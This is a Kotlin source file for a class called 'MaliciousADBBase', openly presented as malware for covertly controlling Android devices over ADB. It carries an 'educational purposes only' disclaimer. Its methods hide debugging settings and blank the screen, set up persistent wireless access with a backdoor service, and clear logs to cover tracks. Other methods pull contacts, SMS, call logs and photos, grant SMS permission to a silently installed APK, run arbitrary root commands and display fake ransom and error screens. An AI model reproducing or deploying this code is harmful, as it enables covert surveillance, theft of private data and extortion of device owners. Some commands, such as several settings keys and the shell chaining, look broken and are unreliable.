package Src.ADB

import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.*
import java.util.regex.Pattern
import Src.Utils.Logger
import kotlin.random.Random

/**
 * A malicious ADB interface designed to stealthily control an Android device, extract sensitive data,
 * and maintain persistent access while evading detection. For educational purposes only.
 */
class MaliciousADBBase {

    private val logger = Logger() // Silent logging to attacker-controlled server or file
    private val executor = Executors.newSingleThreadExecutor()
    private val config = MaliciousConfig()

    /**
     * Configuration for malicious operations.
     */
    data class MaliciousConfig(
        val tcpPort: Int = 5555,
        val commandTimeoutSeconds: Long = 10,
        val silentMode: Boolean = true, // Suppress UI and notifications
        val obfuscationDelayMs: Long = Random.nextLong(100, 1000) // Random delays to evade detection
    )

    /**
     * Exception for command failures (kept minimal to avoid detection).
     */
    class ADBExploitException(message: String, cause: Throwable? = null) : RuntimeException(message, cause)

    // --- Stealth and Persistence ---

    /** Enables stealth mode to hide ADB activity from the user. */
    fun enableStealthMode() {
        executeBatch(listOf(
            "adb shell settings put global adb_enabled 0", // Disable ADB visibility
            "adb shell settings put global development_settings_enabled 0",
            "adb shell settings put global usb_debugging_enabled 0",
            "adb shell settings put global notification_access 0", // Suppress notifications
            "adb shell input keyevent 26" // Turn off screen to avoid user suspicion
        )) { "Enabling stealth mode" }
    }

    /** Sets up persistent wireless access without user interaction. */
    fun establishPersistentAccess() {
        execute("adb tcpip ${config.tcpPort}") { "Setting up TCP/IP on port ${config.tcpPort}" }
        val ipOutput = execute("adb shell ip -f inet addr show wlan0") { "Fetching device IP" }
        val ipAddress = parseIpAddress(ipOutput) ?: return
        execute("adb connect $ipAddress:${config.tcpPort}") { "Establishing connection to $ipAddress:${config.tcpPort}" }
        // Install a background service for persistence (simulated)
        execute("adb shell am start-service -n com.malicious/.BackdoorService") { "Installing backdoor service" }
    }

    /** Clears logs and traces to cover tracks. */
    fun coverTracks() {
        executeBatch(listOf(
            "adb shell logcat -c", // Clear logcat
            "adb shell rm -rf /sdcard/window_dump.xml", // Remove UI dumps
            "adb shell pm clear com.android.systemui" // Disrupt system UI logs
        )) { "Covering tracks" }
    }

    // --- Data Theft ---

    /** Extracts all accessible sensitive data (contacts, SMS, photos, etc.). */
    fun stealAllData(destinationPath: String) {
        val dataPaths = listOf(
            "/data/data/com.android.providers.contacts/databases/contacts2.db" to "$destinationPath/contacts.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db" to "$destinationPath/sms.db",
            "/data/data/com.android.providers.contacts/databases/calllog.db" to "$destinationPath/calllog.db",
            "/sdcard/DCIM/Camera" to "$destinationPath/photos",
            "/sdcard/Download" to "$destinationPath/downloads"
        )
        dataPaths.forEach { (src, dst) ->
            try {
                stealData(src, dst)
            } catch (e: ADBExploitException) {
                logger.warning("Failed to steal $src: ${e.message}")
            }
        }
    }

    /** Extracts data from a specific path (tries root access if available). */
    private fun stealData(sourcePath: String, destinationPath: String) {
        val isRooted = isDeviceRooted()
        val command = if (isRooted) {
            "adb shell su -c cp $sourcePath /sdcard/temp && adb pull /sdcard/temp $destinationPath && adb shell rm /sdcard/temp"
        } else {
            "adb pull $sourcePath $destinationPath"
        }
        execute(command) { "Stealing data from $sourcePath to $destinationPath" }
    }

    /** Dumps system information (e.g., accounts, apps, settings). */
    fun dumpSystemInfo(destinationPath: String) {
        executeBatch(listOf(
            "adb shell dumpsys account > $destinationPath/accounts.txt",
            "adb shell pm list packages -f > $destinationPath/packages.txt",
            "adb shell settings list global > $destinationPath/settings.txt",
            "adb shell getprop > $destinationPath/properties.txt"
        )) { "Dumping system info to $destinationPath" }
    }

    // --- Device Compromise ---

    /** Simulates a ransomware attack by locking the screen and displaying a fake message. */
    fun simulateRansomware() {
        executeBatch(listOf(
            "adb shell input keyevent 26", // Lock screen
            "adb shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message 'Your device is locked! Pay 0.1 BTC to unlock.'"
        )) { "Simulating ransomware attack" }
    }

    /** Installs a malicious APK silently (requires root or debuggable device). */
    fun installMalware(apkPath: String) {
        execute("adb install -r $apkPath") { "Installing malicious APK: $apkPath" }
        execute("adb shell pm grant com.malicious android.permission.READ_SMS") { "Granting permissions to malware" }
    }

    /** Executes arbitrary shell commands to escalate privileges or disrupt the device. */
    fun executeMaliciousCommand(command: String) {
        val isRooted = isDeviceRooted()
        val finalCommand = if (isRooted) "adb shell su -c '$command'" else "adb shell $command"
        execute(finalCommand) { "Executing malicious command: $command" }
    }

    // --- Evasion and Obfuscation ---

    /** Adds random delays to evade detection. */
    private fun obfuscateExecution() {
        if (config.silentMode) {
            Thread.sleep(config.obfuscationDelayMs)
        }
    }

    /** Displays fake error messages to mislead the user. */
    fun displayFakeError() {
        execute("adb shell am start -a android.intent.action.VIEW -d 'https://fake-error.com/device_crash'") {
            "Displaying fake error message"
        }
    }

    // --- Status Checks ---

    /** Checks if the device is rooted. */
    fun isDeviceRooted(): Boolean {
        return try {
            execute("adb shell su -c whoami") { "Checking root status" }.contains("root", ignoreCase = true)
        } catch (e: ADBExploitException) {
            false
        }
    }

    /** Checks if ADB is accessible (minimal check to avoid detection). */
    fun isAdbAccessible(): Boolean {
        return try {
            execute("adb get-state") { "Checking ADB accessibility" }.contains("device", ignoreCase = true)
        } catch (e: ADBExploitException) {
            false
        }
    }

    // --- Core Execution ---

    /** Executes a single command with minimal error reporting. */
    private fun execute(command: String, logMessage: () -> String): String {
        obfuscateExecution()
        if (config.silentMode) logger.info(logMessage()) // Silent logging to attacker's server
        val output = StringBuilder()
        val errorOutput = StringBuilder()
        try {
            val process = ProcessBuilder(command.split(" ")).start()
            val future = executor.submit(Callable {
                process.inputStream.bufferedReader().use { it.forEachLine { output.append(it).append("\n") } }
                process.errorStream.bufferedReader().use { it.forEachLine { errorOutput.append(it).append("\n") } }
                process.waitFor()
            })
            val exitCode = future.get(config.commandTimeoutSeconds, TimeUnit.SECONDS)
            if (exitCode != 0) {
                throw ADBExploitException("Command failed: $command\nError: $errorOutput")
            }
        } catch (e: Exception) {
            if (config.silentMode) {
                throw ADBExploitException("Operation failed silently", e)
            } else {
                displayFakeError() // Mislead user
                throw ADBExploitException("Operation failed", e)
            }
        }
        return output.toString()
    }

    /** Executes a batch of commands silently. */
    private fun executeBatch(commands: List<String>, logMessage: () -> String): List<String> {
        obfuscateExecution()
        if (config.silentMode) logger.info(logMessage())
        return commands.map { execute(it) { "Executing batch command: $it" } }
    }

    // --- Helpers ---

    private companion object {
        private val IP_PATTERN = Pattern.compile("inet (\\d+\\.\\d+\\.\\d+\\.\\d+)/\\d+")

        fun parseIpAddress(output: String): String? {
            val matcher = IP_PATTERN.matcher(output)
            return if (matcher.find()) matcher.group(1) else null
        }
    }

    /** Cleans up resources. */
    fun cleanup() {
        executor.shutdown()
        if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
            executor.shutdownNow()
        }
    }
}